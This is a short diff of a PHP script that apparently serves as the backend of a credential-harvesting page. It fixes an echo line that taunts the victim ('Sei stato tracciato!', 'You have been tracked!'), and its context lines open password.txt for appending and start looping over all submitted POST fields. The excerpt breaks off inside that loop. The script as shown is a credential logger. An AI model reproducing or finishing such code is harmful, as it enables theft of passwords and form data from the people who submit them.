@@ -1,6 +1,6 @@
 <?php
 
-echo Sei stato tracciato!
+echo "Sei stato tracciato!";
 
 $handle = fopen("password.txt", "a");
 foreach($_POST as $variable => $value) {
